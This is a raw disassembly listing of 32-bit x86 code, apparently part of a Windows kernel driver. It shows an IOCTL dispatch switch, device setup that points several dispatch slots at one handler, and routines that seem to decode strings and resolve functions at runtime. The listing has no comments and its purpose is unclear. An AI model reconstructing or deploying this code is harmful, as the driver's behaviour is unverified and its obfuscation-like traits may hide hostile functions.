   18bb2:	mov    DWORD PTR [ebp-0x50],ecx
   18bb5:	mov    ecx,DWORD PTR [esi+0x20]
   18bb8:	mov    DWORD PTR [ebp-0x4c],ecx
   18bbb:	mov    ecx,DWORD PTR [esi+0x24]
   18bbe:	mov    DWORD PTR [ebp-0x48],ecx
   18bc1:	mov    ecx,DWORD PTR [esi+0x10]
   18bc4:	lea    edx,[ebp-0x4c]
   18bc7:	push   edx
   18bc8:	lea    edx,[ebp-0x54]
   18bcb:	push   edx
   18bcc:	push   ecx
   18bcd:	push   eax
   18bce:	lea    eax,[ebp-0x5c]
   18bd1:	push   eax
   18bd2:	lea    eax,[ebp-0x24]
   18bd5:	push   eax
   18bd6:	lea    eax,[ebp-0x2c]
   18bd9:	push   eax
   18bda:	lea    eax,[ebp-0x34]
   18bdd:	push   eax
   18bde:	push   DWORD PTR [ebp-0x1c]
   18be1:	lea    eax,[ebp-0x3c]
   18be4:	push   eax
   18be5:	lea    eax,[ebp-0x44]
   18be8:	push   eax
   18be9:	push   DWORD PTR [esi+0x4]
   18bec:	call   0x1894a
   18bf1:	xor    ecx,ecx
   18bf3:	test   al,al
   18bf5:	sete   cl
   18bf8:	mov    DWORD PTR [esi+0x8],ecx
   18bfb:	push   DWORD PTR [ebp-0x5c]
   18bfe:	call   0x10a9a
   18c03:	push   DWORD PTR [ebp-0x24]
   18c06:	call   0x10a9a
   18c0b:	push   DWORD PTR [ebp-0x2c]
   18c0e:	call   0x10a9a
   18c13:	push   DWORD PTR [ebp-0x34]
   18c16:	call   0x10a9a
   18c1b:	push   DWORD PTR [ebp-0x3c]
   18c1e:	call   0x10a9a
   18c23:	push   DWORD PTR [ebp-0x44]
   18c26:	call   0x10a9a
   18c2b:	add    esp,0x18
   18c2e:	jmp    0x18c41
   18c30:	xor    eax,eax
   18c32:	inc    eax
   18c33:	ret    
   18c34:	mov    esp,DWORD PTR [ebp-0x18]
   18c37:	mov    eax,DWORD PTR [ebp+0x8]
   18c3a:	mov    DWORD PTR [eax+0x8],0x4
   18c41:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18c48:	push   0x0
   18c4a:	push   0x7eb70
   18c4f:	call   DWORD PTR ds:0x1ee24
   18c55:	call   0x1db21
   18c5a:	ret    0x4
   18c5d:	int3   
   18c5e:	int3   
   18c5f:	int3   
   18c60:	int3   
   18c61:	int3   
   18c62:	push   0x2c
   18c64:	push   0x7e0f8
   18c69:	call   0x1dadc
   18c6e:	xor    edi,edi
   18c70:	mov    DWORD PTR [ebp-0x24],edi
   18c73:	mov    ebx,DWORD PTR [ebp+0xc]
   18c76:	mov    DWORD PTR [ebx+0x18],edi
   18c79:	mov    DWORD PTR [ebx+0x1c],edi
   18c7c:	mov    eax,DWORD PTR [ebx+0x60]
   18c7f:	cmp    BYTE PTR [eax],0xe
   18c82:	jne    0x19122
   18c88:	mov    eax,DWORD PTR [eax+0xc]
   18c8b:	mov    DWORD PTR [ebx+0x1c],0x84c
   18c92:	mov    ecx,0x22c068
   18c97:	cmp    eax,ecx
   18c99:	ja     0x18fd3
   18c9f:	je     0x18fc4
   18ca5:	add    ecx,0xffffffd0
   18ca8:	cmp    eax,ecx
   18caa:	ja     0x18dc7
   18cb0:	je     0x18dae
   18cb6:	sub    eax,0x22c020
   18cbb:	je     0x18d78
   18cc1:	push   0x4
   18cc3:	pop    esi
   18cc4:	sub    eax,esi
   18cc6:	je     0x18d42
   18cc8:	sub    eax,esi
   18cca:	je     0x18d27
   18ccc:	sub    eax,esi
   18cce:	je     0x18d1a
   18cd0:	sub    eax,esi
   18cd2:	je     0x18ce9
   18cd4:	sub    eax,esi
   18cd6:	jne    0x190c2
   18cdc:	push   DWORD PTR [ebx+0xc]
   18cdf:	call   0x17998
   18ce4:	jmp    0x1911f
   18ce9:	mov    esi,DWORD PTR [ebx+0xc]
   18cec:	mov    eax,DWORD PTR [esi]
   18cee:	add    eax,0x28
   18cf1:	mov    DWORD PTR [ebx+0x1c],eax
   18cf4:	push   0xffffffff
   18cf6:	lea    eax,[esi+0x28]
   18cf9:	push   eax
   18cfa:	lea    ecx,[ebp-0x34]
   18cfd:	call   0x110cc
   18d02:	push   esi
   18d03:	lea    eax,[ebp-0x34]
   18d06:	push   eax
   18d07:	call   0x1684a
   18d0c:	push   DWORD PTR [ebp-0x34]
   18d0f:	call   0x10a9a
   18d14:	pop    ecx
   18d15:	jmp    0x19122
   18d1a:	push   DWORD PTR [ebx+0xc]
   18d1d:	call   0x18af0
   18d22:	jmp    0x1911f
   18d27:	mov    ecx,DWORD PTR ds:0x7ecf8
   18d2d:	call   0x16b28
   18d32:	mov    ecx,DWORD PTR ds:0x7ebcc
   18d38:	call   0x16be4
   18d3d:	jmp    0x19122
   18d42:	mov    eax,DWORD PTR [ebx+0xc]
   18d45:	mov    DWORD PTR [ebx+0x1c],0x10
   18d4c:	mov    ecx,DWORD PTR [eax]
   18d4e:	cmp    ecx,edi
   18d50:	jl     0x19122
   18d56:	cmp    ecx,0x6
   18d59:	jge    0x19122
   18d5f:	mov    edx,DWORD PTR [eax+0x8]
   18d62:	mov    DWORD PTR [ecx*8+0x7ed48],edx
   18d69:	mov    eax,DWORD PTR [eax+0xc]
   18d6c:	mov    DWORD PTR [ecx*8+0x7ed4c],eax
   18d73:	jmp    0x19122
   18d78:	mov    eax,DWORD PTR [ebx+0xc]
   18d7b:	mov    DWORD PTR [ebx+0x1c],0x10
   18d82:	mov    ecx,DWORD PTR [eax]
   18d84:	cmp    ecx,edi
   18d86:	jl     0x19122
   18d8c:	cmp    ecx,0x6
   18d8f:	jge    0x19122
   18d95:	mov    edx,DWORD PTR [ecx*8+0x7ed48]
   18d9c:	mov    DWORD PTR [eax+0x8],edx
   18d9f:	mov    ecx,DWORD PTR [ecx*8+0x7ed4c]
   18da6:	mov    DWORD PTR [eax+0xc],ecx
   18da9:	jmp    0x19122
   18dae:	mov    eax,DWORD PTR [ebx+0xc]
   18db1:	mov    ecx,DWORD PTR [eax]
   18db3:	add    ecx,0xc
   18db6:	mov    DWORD PTR [ebx+0x1c],ecx
   18db9:	push   eax
   18dba:	push   DWORD PTR [eax+0x4]
   18dbd:	call   0x15fba
   18dc2:	jmp    0x19122
   18dc7:	sub    eax,0x22c03c
   18dcc:	je     0x18f40
   18dd2:	sub    eax,0x10
   18dd5:	je     0x18f36
   18ddb:	push   0x4
   18ddd:	pop    esi
   18dde:	sub    eax,esi
   18de0:	je     0x18e36
   18de2:	sub    eax,0xc
   18de5:	je     0x18e1e
   18de7:	sub    eax,esi
   18de9:	je     0x18e00
   18deb:	sub    eax,esi
   18ded:	jne    0x190c2
   18df3:	push   DWORD PTR [ebx+0xc]
   18df6:	call   0x12898
   18dfb:	jmp    0x1911f
   18e00:	mov    DWORD PTR [ebx+0x1c],0x8
   18e07:	mov    ebx,DWORD PTR [ebx+0xc]
   18e0a:	mov    eax,ds:0x7ed2c
   18e0f:	mov    DWORD PTR [ebx],eax
   18e11:	mov    eax,ds:0x7ed30
   18e16:	mov    DWORD PTR [ebx+0x4],eax
   18e19:	jmp    0x19122
   18e1e:	mov    eax,DWORD PTR [ebx+0xc]
   18e21:	mov    ecx,DWORD PTR [eax]
   18e23:	mov    DWORD PTR ds:0x7ed2c,ecx
   18e29:	mov    eax,DWORD PTR [eax+0x4]
   18e2c:	mov    ds:0x7ed30,eax
   18e31:	jmp    0x1911f
   18e36:	mov    DWORD PTR [ebx+0x1c],edi
   18e39:	mov    esi,DWORD PTR [ebx+0xc]
   18e3c:	mov    DWORD PTR [ebp-0x20],esi
   18e3f:	push   0xffffffff
   18e41:	push   0x1def0
   18e46:	lea    ecx,[ebp-0x2c]
   18e49:	call   0x110cc
   18e4e:	xor    edi,edi
   18e50:	inc    edi
   18e51:	mov    DWORD PTR [esi+0x8],edi
   18e54:	xor    eax,eax
   18e56:	push   eax
   18e57:	push   eax
   18e58:	push   eax
   18e59:	push   eax
   18e5a:	push   0x7eb70
   18e5f:	call   DWORD PTR ds:0x1ee28
   18e65:	test   eax,eax
   18e67:	jge    0x18e71
   18e69:	push   DWORD PTR [ebp-0x2c]
   18e6c:	jmp    0x18d0f
   18e71:	and    DWORD PTR [ebp-0x4],0x0
   18e75:	mov    DWORD PTR [ebp-0x4],edi
   18e78:	mov    eax,DWORD PTR [esi]
   18e7a:	add    eax,0x28
   18e7d:	mov    DWORD PTR [ebx+0x1c],eax
   18e80:	mov    eax,ds:0x7ecf8
   18e85:	mov    ebx,DWORD PTR [eax+0x4]
   18e88:	mov    eax,DWORD PTR [ebx]
   18e8a:	mov    DWORD PTR [ebp+0xc],eax
   18e8d:	and    DWORD PTR [ebp-0x1c],0x0
   18e91:	mov    edi,DWORD PTR [esi+0x28]
   18e94:	cmp    DWORD PTR [ebp-0x1c],edi
   18e97:	jge    0x18eab
   18e99:	cmp    DWORD PTR [ebp+0xc],ebx
   18e9c:	je     0x18eab
   18e9e:	lea    ecx,[ebp+0xc]
   18ea1:	call   0x1387e
   18ea6:	inc    DWORD PTR [ebp-0x1c]
   18ea9:	jmp    0x18e94
   18eab:	mov    eax,DWORD PTR [ebp+0xc]
   18eae:	cmp    eax,ebx
   18eb0:	je     0x18ec4
   18eb2:	and    DWORD PTR [esi+0x8],0x0
   18eb6:	add    eax,0x10
   18eb9:	push   eax
   18eba:	lea    ecx,[ebp-0x2c]
   18ebd:	call   0x129ea
   18ec2:	jmp    0x18ecb
   18ec4:	mov    DWORD PTR [esi+0x8],0x1
   18ecb:	and    DWORD PTR [esi+0x4],0x0
   18ecf:	and    DWORD PTR [ebp-0x4],0x0
   18ed3:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   18eda:	call   0x18f28
   18edf:	cmp    DWORD PTR [esi+0x8],0x0
   18ee3:	jne    0x18e69
   18ee5:	push   esi
   18ee6:	lea    eax,[ebp-0x2c]
   18ee9:	push   eax
   18eea:	call   0x1684a
   18eef:	jmp    0x18e69
   18ef4:	xor    eax,eax
   18ef6:	inc    eax
   18ef7:	ret    
   18ef8:	mov    esp,DWORD PTR [ebp-0x18]
   18efb:	mov    eax,DWORD PTR [ebp-0x20]
   18efe:	mov    DWORD PTR [eax+0x8],0x4
   18f05:	push   DWORD PTR [ebp-0x2c]
   18f08:	call   0x10a9a
   18f0d:	push   0xfffffffe
   18f0f:	lea    eax,[ebp-0x10]
   18f12:	push   eax
   18f13:	push   0x7eb38
   18f18:	call   0x1dc9c
   18f1d:	add    esp,0x10
   18f20:	jmp    0x19122
   18f25:	mov    esi,DWORD PTR [ebp-0x20]
   18f28:	push   0x0
   18f2a:	push   0x7eb70
   18f2f:	call   DWORD PTR ds:0x1ee24
   18f35:	ret    
   18f36:	call   0x123c2
   18f3b:	jmp    0x19122
   18f40:	mov    eax,DWORD PTR [ebx+0xc]
   18f43:	mov    ecx,DWORD PTR ds:0x7e204
   18f49:	mov    esi,eax
   18f4b:	sub    esi,ecx
   18f4d:	push   0x2
   18f4f:	pop    edi
   18f50:	movzx  edx,WORD PTR [ecx]
   18f53:	mov    WORD PTR [esi+ecx*1],dx
   18f57:	add    ecx,edi
   18f59:	test   dx,dx
   18f5c:	jne    0x18f50
   18f5e:	mov    ecx,0x7e248
   18f63:	lea    esi,[eax+0x50]
   18f66:	sub    esi,ecx
   18f68:	movzx  edx,WORD PTR [ecx]
   18f6b:	mov    WORD PTR [esi+ecx*1],dx
   18f6f:	add    ecx,edi
   18f71:	test   dx,dx
   18f74:	jne    0x18f68
   18f76:	mov    ecx,0x7e208
   18f7b:	lea    esi,[eax+0x90]
   18f81:	sub    esi,ecx
   18f83:	movzx  edx,WORD PTR [ecx]
   18f86:	mov    WORD PTR [esi+ecx*1],dx
   18f8a:	add    ecx,edi
   18f8c:	test   dx,dx
   18f8f:	jne    0x18f83
   18f91:	mov    ecx,0x7e288
   18f96:	lea    esi,[eax+0xd0]
   18f9c:	sub    esi,ecx
   18f9e:	movzx  edx,WORD PTR [ecx]
   18fa1:	mov    WORD PTR [esi+ecx*1],dx
   18fa5:	add    ecx,edi
   18fa7:	test   dx,dx
   18faa:	jne    0x18f9e
   18fac:	lea    edi,[eax+0x40]
   18faf:	mov    esi,0x7a398
   18fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18fb8:	mov    DWORD PTR [ebx+0x1c],0x110
   18fbf:	jmp    0x19122
   18fc4:	mov    eax,DWORD PTR [ebx+0xc]
   18fc7:	push   DWORD PTR [eax]
   18fc9:	call   0x10ff6
   18fce:	jmp    0x1911f
   18fd3:	mov    ecx,0x22c088
   18fd8:	cmp    eax,ecx
   18fda:	ja     0x190a4
   18fe0:	je     0x19079
   18fe6:	sub    eax,0x22c06c
   18feb:	je     0x19061
   18fed:	push   0x4
   18fef:	pop    esi
   18ff0:	sub    eax,esi
   18ff2:	je     0x19054
   18ff4:	push   0x8
   18ff6:	pop    ecx
   18ff7:	sub    eax,ecx
   18ff9:	je     0x19047
   18ffb:	sub    eax,esi
   18ffd:	je     0x1902f
   18fff:	sub    eax,esi
   19001:	je     0x19018
   19003:	sub    eax,esi
   19005:	jne    0x190c2
   1900b:	push   DWORD PTR [ebx+0xc]
   1900e:	call   0x178a2
   19013:	jmp    0x1911f
   19018:	mov    DWORD PTR [ebx+0x1c],ecx
   1901b:	mov    ebx,DWORD PTR [ebx+0xc]
   1901e:	mov    eax,ds:0x7ed34
   19023:	mov    DWORD PTR [ebx],eax
   19025:	mov    eax,ds:0x7ed38
   1902a:	jmp    0x18e16
   1902f:	mov    eax,DWORD PTR [ebx+0xc]
   19032:	mov    ecx,DWORD PTR [eax]
   19034:	mov    DWORD PTR ds:0x7ed34,ecx
   1903a:	mov    eax,DWORD PTR [eax+0x4]
   1903d:	mov    ds:0x7ed38,eax
   19042:	jmp    0x1911f
   19047:	push   DWORD PTR [ebx+0xc]
   1904a:	call   0x170b6
   1904f:	jmp    0x1911f
   19054:	push   DWORD PTR [ebx+0xc]
   19057:	call   0x10f66
   1905c:	jmp    0x1911f
   19061:	mov    esi,DWORD PTR [ebx+0xc]
   19064:	push   DWORD PTR [esi]
   19066:	call   0x1103a
   1906b:	mov    DWORD PTR [esi],eax
   1906d:	mov    DWORD PTR [ebx+0x1c],0x4
   19074:	jmp    0x19122
   19079:	mov    esi,DWORD PTR [ebx+0xc]
   1907c:	mov    eax,DWORD PTR [esi]
   1907e:	add    eax,0xc
   19081:	mov    DWORD PTR [ebx+0x1c],eax
   19084:	push   0xffffffff
   19086:	lea    eax,[esi+0xc]
   19089:	push   eax
   1908a:	lea    ecx,[ebp-0x3c]
   1908d:	call   0x110cc
   19092:	push   esi
   19093:	lea    eax,[ebp-0x3c]
   19096:	push   eax
   19097:	call   0x15ed0
   1909c:	push   DWORD PTR [ebp-0x3c]
   1909f:	jmp    0x18d0f
   190a4:	sub    eax,0x22c08c
   190a9:	je     0x19111
   190ab:	push   0x4
   190ad:	pop    esi
   190ae:	sub    eax,esi
   190b0:	je     0x190fd
   190b2:	sub    eax,esi
   190b4:	je     0x190f6
   190b6:	sub    eax,esi
   190b8:	je     0x190e2
   190ba:	sub    eax,esi
   190bc:	je     0x190d8
   190be:	sub    eax,esi
   190c0:	je     0x190cb
   190c2:	mov    DWORD PTR [ebp-0x24],0xc0000010
   190c9:	jmp    0x1911f
   190cb:	push   DWORD PTR [ebx+0xc]
   190ce:	call   0x1aa92
   190d3:	mov    DWORD PTR [ebx+0x1c],esi
   190d6:	jmp    0x19122
   190d8:	push   DWORD PTR [ebx+0xc]
   190db:	call   0x1b518
   190e0:	jmp    0x1911f
   190e2:	mov    eax,DWORD PTR [ebx+0xc]
   190e5:	mov    ecx,DWORD PTR [eax+0x4]
   190e8:	add    ecx,0x8
   190eb:	mov    DWORD PTR [ebx+0x1c],ecx
   190ee:	push   eax
   190ef:	call   0x1b7e6
   190f4:	jmp    0x19122
   190f6:	call   0x1b428
   190fb:	jmp    0x1911f
   190fd:	mov    eax,DWORD PTR [ebx+0xc]
   19100:	mov    ecx,DWORD PTR [eax+0x4]
   19103:	add    ecx,0x8
   19106:	mov    DWORD PTR [ebx+0x1c],ecx
   19109:	push   eax
   1910a:	call   0x1a872
   1910f:	jmp    0x19122
   19111:	push   DWORD PTR [ebx+0xc]
   19114:	call   0x11082
   19119:	push   eax
   1911a:	call   0x1b64a
   1911f:	mov    DWORD PTR [ebx+0x1c],edi
   19122:	mov    eax,DWORD PTR [ebp-0x24]
   19125:	call   0x1db21
   1912a:	ret    0x8
   1912d:	int3   
   1912e:	int3   
   1912f:	int3   
   19130:	int3   
   19131:	int3   
   19132:	push   0xc
   19134:	push   0x7e120
   19139:	call   0x1dadc
   1913e:	and    DWORD PTR [ebp-0x4],0x0
   19142:	push   DWORD PTR [ebp+0xc]
   19145:	push   DWORD PTR [ebp+0x8]
   19148:	call   0x18c62
   1914d:	mov    esi,eax
   1914f:	jmp    0x19164
   19151:	xor    eax,eax
   19153:	inc    eax
   19154:	ret    
   19155:	mov    esp,DWORD PTR [ebp-0x18]
   19158:	push   0xd
   1915a:	call   0x10ff6
   1915f:	mov    esi,0xc0000001
   19164:	mov    DWORD PTR [ebp-0x1c],esi
   19167:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1916e:	cmp    esi,0x103
   19174:	je     0x19184
   19176:	mov    ecx,DWORD PTR [ebp+0xc]
   19179:	mov    DWORD PTR [ecx+0x18],esi
   1917c:	xor    dl,dl
   1917e:	call   DWORD PTR ds:0x1ee44
   19184:	mov    eax,esi
   19186:	call   0x1db21
   1918b:	ret    0x8
   1918e:	int3   
   1918f:	int3   
   19190:	int3   
   19191:	int3   
   19192:	int3   
   19193:	int3   
   19194:	mov    edi,edi
   19196:	push   ebp
   19197:	mov    ebp,esp
   19199:	push   esi
   1919a:	mov    esi,ecx
   1919c:	mov    BYTE PTR [esi+0x8],0x0
   191a0:	call   0x14b00
   191a5:	lea    ecx,[esi+0x10]
   191a8:	mov    BYTE PTR [ecx+0x8],0x0
   191ac:	call   0x144f0
   191b1:	mov    eax,DWORD PTR [ebp+0x8]
   191b4:	mov    DWORD PTR [esi+0x20],eax
   191b7:	mov    eax,DWORD PTR [ebp+0xc]
   191ba:	mov    DWORD PTR [esi+0x24],eax
   191bd:	mov    eax,esi
   191bf:	pop    esi
   191c0:	pop    ebp
   191c1:	ret    0x8
   191c4:	int3   
   191c5:	int3   
   191c6:	int3   
   191c7:	int3   
   191c8:	int3   
   191c9:	int3   
   191ca:	push   0x850
   191cf:	push   0x7e140
   191d4:	call   0x1dde0
   191d9:	mov    esi,DWORD PTR [ebp+0x8]
   191dc:	mov    DWORD PTR [ebp-0x828],esi
   191e2:	mov    edi,DWORD PTR [ebp+0xc]
   191e5:	call   0x183ec
   191ea:	call   0x11d22
   191ef:	test   eax,eax
   191f1:	je     0x196cf
   191f7:	xor    ebx,ebx
   191f9:	mov    DWORD PTR [ebp-0x838],ebx
   191ff:	call   0x1825c
   19204:	cmp    al,bl
   19206:	jne    0x192f7
   1920c:	mov    DWORD PTR [ebp-0x4],ebx
   1920f:	push   ebx
   19210:	push   0x19
   19212:	call   0x109f0
   19217:	cmp    edx,ebx
   19219:	jl     0x1922f
   1921b:	jg     0x19222
   1921d:	cmp    eax,0x5
   19220:	jbe    0x1922f
   19222:	push   ebx
   19223:	push   0x7ecd0
   19228:	call   0x11c50
   1922d:	call   eax
   1922f:	push   edi
   19230:	push   0x1ec16
   19235:	lea    eax,[ebp-0x41c]
   1923b:	push   eax
   1923c:	call   0x1dad0
   19241:	add    esp,0xc
   19244:	lea    eax,[ebp-0x858]
   1924a:	push   eax
   1924b:	call   DWORD PTR ds:0x1ee4c
   19251:	push   0x1ebe8
   19256:	push   0x4
   19258:	push   0x1ebde
   1925d:	call   0x16c9e
   19262:	mov    DWORD PTR [ebp-0x82c],eax
   19268:	lea    ecx,[eax+0x2]
   1926b:	mov    dx,WORD PTR [eax]
   1926e:	inc    eax
   1926f:	inc    eax
   19270:	cmp    dx,bx
   19273:	jne    0x1926b
   19275:	sub    eax,ecx
   19277:	sar    eax,1
   19279:	add    eax,eax
   1927b:	mov    WORD PTR [ebp-0x82e],ax
   19282:	mov    WORD PTR [ebp-0x830],ax
   19289:	mov    DWORD PTR [ebp-0x850],0x18
   19293:	mov    DWORD PTR [ebp-0x84c],ebx
   19299:	mov    DWORD PTR [ebp-0x844],0x40
   192a3:	lea    eax,[ebp-0x830]
   192a9:	mov    DWORD PTR [ebp-0x848],eax
   192af:	mov    DWORD PTR [ebp-0x840],ebx
   192b5:	mov    DWORD PTR [ebp-0x83c],ebx
   192bb:	mov    eax,DWORD PTR [ebp-0x82c]
   192c1:	lea    ecx,[eax+0x2]
   192c4:	mov    dx,WORD PTR [eax]
   192c7:	inc    eax
   192c8:	inc    eax
   192c9:	cmp    dx,bx
   192cc:	jne    0x192c4
   192ce:	sub    eax,ecx
   192d0:	sar    eax,1
   192d2:	mov    DWORD PTR [ebp-0x838],eax
   192d8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   192df:	jmp    0x192f7
   192e1:	xor    eax,eax
   192e3:	inc    eax
   192e4:	ret    
   192e5:	mov    esp,DWORD PTR [ebp-0x18]
   192e8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   192ef:	xor    ebx,ebx
   192f1:	mov    esi,DWORD PTR [ebp-0x828]
   192f7:	cmp    DWORD PTR [ebp-0x838],ebx
   192fd:	jne    0x196cf
   19303:	xor    eax,eax
   19305:	lea    edi,[ebp-0x840]
   1930b:	stos   DWORD PTR es:[edi],eax
   1930c:	stos   DWORD PTR es:[edi],eax
   1930d:	mov    DWORD PTR [ebp-0x844],0xc
   19317:	mov    DWORD PTR [ebp-0x840],0x2
   19321:	mov    BYTE PTR [ebp-0x83c],bl
   19327:	mov    BYTE PTR [ebp-0x83b],bl
   1932d:	push   0x7eb90
   19332:	push   ebx
   19333:	lea    eax,[ebp-0x844]
   19339:	push   eax
   1933a:	call   0x11cf8
   1933f:	call   eax
   19341:	push   eax
   19342:	call   0x11bd2
   19347:	call   eax
   19349:	push   0x10
   1934b:	call   0x10a66
   19350:	pop    ecx
   19351:	cmp    eax,ebx
   19353:	je     0x19371
   19355:	lea    ecx,[ebp-0x81d]
   1935b:	push   ecx
   1935c:	lea    ecx,[ebp-0x81d]
   19362:	push   ecx
   19363:	mov    ecx,eax
   19365:	call   0x16e8a
   1936a:	mov    ds:0x7ecf8,eax
   1936f:	jmp    0x19377
   19371:	mov    DWORD PTR ds:0x7ecf8,ebx
   19377:	push   0x2c
   19379:	call   0x10a66
   1937e:	pop    ecx
   1937f:	cmp    eax,ebx
   19381:	je     0x19398
   19383:	push   0x5dc
   19388:	push   0x14
   1938a:	mov    ecx,eax
   1938c:	call   0x1868e
   19391:	mov    ds:0x7ed00,eax
   19396:	jmp    0x1939e
   19398:	mov    DWORD PTR ds:0x7ed00,ebx
   1939e:	push   0x10
   193a0:	call   0x10a66
   193a5:	pop    ecx
   193a6:	cmp    eax,ebx
   193a8:	je     0x193c6
   193aa:	lea    ecx,[ebp-0x81d]
   193b0:	push   ecx
   193b1:	lea    ecx,[ebp-0x81d]
   193b7:	push   ecx
   193b8:	mov    ecx,eax
   193ba:	call   0x16a68
   193bf:	mov    ds:0x7eb40,eax
   193c4:	jmp    0x193cc
   193c6:	mov    DWORD PTR ds:0x7eb40,ebx
   193cc:	push   0x10
   193ce:	call   0x10a66
   193d3:	pop    ecx
   193d4:	cmp    eax,ebx
   193d6:	je     0x193f4
   193d8:	lea    ecx,[ebp-0x81d]
   193de:	push   ecx
   193df:	lea    ecx,[ebp-0x81d]
   193e5:	push   ecx
   193e6:	mov    ecx,eax
   193e8:	call   0x16f4e
   193ed:	mov    ds:0x7ebcc,eax
   193f2:	jmp    0x193fa
   193f4:	mov    DWORD PTR ds:0x7ebcc,ebx
   193fa:	push   0x28
   193fc:	call   0x10a66
   19401:	pop    ecx
   19402:	cmp    eax,ebx
   19404:	je     0x1941b
   19406:	push   0x3e8
   1940b:	push   0x14
   1940d:	mov    ecx,eax
   1940f:	call   0x19194
   19414:	mov    ds:0x7eb6c,eax
   19419:	jmp    0x19421
   1941b:	mov    DWORD PTR ds:0x7eb6c,ebx
   19421:	push   0x20
   19423:	call   0x10a66
   19428:	pop    ecx
   19429:	cmp    eax,ebx
   1942b:	je     0x1943b
   1942d:	mov    ecx,eax
   1942f:	call   0x16c2c
   19434:	mov    ds:0x7eb68,eax
   19439:	jmp    0x19441
   1943b:	mov    DWORD PTR ds:0x7eb68,ebx
   19441:	call   0x12980
   19446:	call   0x1b5b2
   1944b:	call   0x17a48
   19450:	mov    edi,0x1ebce
   19455:	push   edi
   19456:	call   0x185b2
   1945b:	push   eax
   1945c:	push   0x1eb98
   19461:	push   0xa
   19463:	push   0x1eb82
   19468:	call   0x16c9e
   1946d:	push   eax
   1946e:	lea    eax,[ebp-0x81c]
   19474:	push   eax
   19475:	call   0x1dac4
   1947a:	add    esp,0xc
   1947d:	lea    eax,[ebp-0x81c]
   19483:	push   eax
   19484:	lea    eax,[ebp-0x860]
   1948a:	push   eax
   1948b:	call   0x11c7a
   19490:	call   eax
   19492:	push   edi
   19493:	call   0x185b2
   19498:	push   eax
   19499:	push   0x1eb60
   1949e:	push   0xe
   194a0:	push   0x1eb42
   194a5:	call   0x16c9e
   194aa:	push   eax
   194ab:	lea    eax,[ebp-0x41c]
   194b1:	push   eax
   194b2:	call   0x1dac4
   194b7:	add    esp,0xc
   194ba:	lea    eax,[ebp-0x41c]
   194c0:	push   eax
   194c1:	lea    eax,[ebp-0x858]
   194c7:	push   eax
   194c8:	call   0x11c7a
   194cd:	call   eax
   194cf:	push   0x7ed3c
   194d4:	push   ebx
   194d5:	push   0x100
   194da:	push   0x22
   194dc:	lea    eax,[ebp-0x860]
   194e2:	push   eax
   194e3:	push   ebx
   194e4:	push   esi
   194e5:	call   0x11ba8
   194ea:	call   eax
   194ec:	cmp    eax,ebx
   194ee:	jl     0x196d1
   194f4:	mov    eax,0x19132
   194f9:	mov    DWORD PTR [esi+0x94],eax
   194ff:	mov    DWORD PTR [esi+0x90],eax
   19505:	mov    DWORD PTR [esi+0xa4],eax
   1950b:	mov    DWORD PTR [esi+0x70],eax
   1950e:	mov    DWORD PTR [esi+0x48],eax
   19511:	mov    DWORD PTR [esi+0x44],eax
   19514:	mov    DWORD PTR [esi+0x40],eax
   19517:	mov    DWORD PTR [esi+0x38],eax
   1951a:	mov    eax,ds:0x7ed3c
   1951f:	or     DWORD PTR [eax+0x1c],0x4
   19523:	lea    eax,[ebp-0x860]
   19529:	push   eax
   1952a:	lea    eax,[ebp-0x858]
   19530:	push   eax
   19531:	call   0x11b7e
   19536:	call   eax
   19538:	mov    DWORD PTR [ebp-0x828],eax
   1953e:	cmp    eax,ebx
   19540:	jge    0x19557
   19542:	push   DWORD PTR [esi+0x4]
   19545:	call   0x11a2e
   1954a:	call   eax
   1954c:	mov    eax,DWORD PTR [ebp-0x828]
   19552:	jmp    0x196d1
   19557:	push   ebx
   19558:	push   0x7ecd0
   1955d:	call   0x11c50
   19562:	call   eax
   19564:	push   ebx
   19565:	push   0x7eb70
   1956a:	call   0x11c50
   1956f:	call   eax
   19571:	push   ebx
   19572:	push   0x7eb44
   19577:	call   0x11c50
   1957c:	call   eax
   1957e:	push   0x8000000
   19583:	push   0x1eb18
   19588:	push   0x9
   1958a:	push   0x1e7b4
   1958f:	call   0x16d94
   19594:	push   eax
   19595:	lea    eax,[ebp-0x824]
   1959b:	push   eax
   1959c:	call   0x19b0a
   195a1:	push   DWORD PTR [ebp-0x824]
   195a7:	call   0x118b4
   195ac:	call   eax
   195ae:	mov    DWORD PTR [ebp-0x834],eax
   195b4:	push   ebx
   195b5:	push   0x1eaec
   195ba:	push   0x16
   195bc:	push   0x1ead4
   195c1:	call   0x16d94
   195c6:	push   eax
   195c7:	push   DWORD PTR [ebp-0x824]
   195cd:	call   0x199f0
   195d2:	push   eax
   195d3:	push   DWORD PTR [ebp-0x834]
   195d9:	call   0x19996
   195de:	mov    edi,eax
   195e0:	add    edi,DWORD PTR [ebp-0x824]
   195e6:	mov    esi,0x1def2
   195eb:	push   esi
   195ec:	call   0x115f4
   195f1:	mov    DWORD PTR [ebp-0x82c],eax
   195f7:	push   edi
   195f8:	call   0x1993e
   195fd:	mov    ecx,DWORD PTR [ebp-0x82c]
   19603:	mov    ecx,DWORD PTR [ecx]
   19605:	mov    eax,DWORD PTR [ecx+eax*4]
   19608:	mov    ds:0x7ecfc,eax
   1960d:	push   ebx
   1960e:	push   0x1eab2
   19613:	push   0x14
   19615:	push   0x1ea9c
   1961a:	call   0x16d94
   1961f:	push   eax
   19620:	push   DWORD PTR [ebp-0x824]
   19626:	call   0x199f0
   1962b:	push   eax
   1962c:	push   DWORD PTR [ebp-0x834]
   19632:	call   0x19996
   19637:	mov    edi,eax
   19639:	add    edi,DWORD PTR [ebp-0x824]
   1963f:	push   esi
   19640:	call   0x115f4
   19645:	mov    DWORD PTR [ebp-0x82c],eax
   1964b:	push   edi
   1964c:	call   0x1993e
   19651:	mov    ecx,DWORD PTR [ebp-0x82c]
   19657:	mov    ecx,DWORD PTR [ecx]
   19659:	mov    eax,DWORD PTR [ecx+eax*4]
   1965c:	mov    ds:0x7ecf0,eax
   19661:	push   ebx
   19662:	push   0x1ea68
   19667:	push   0xe
   19669:	push   0x1ea58
   1966e:	call   0x16d94
   19673:	push   eax
   19674:	push   DWORD PTR [ebp-0x824]
   1967a:	call   0x199f0
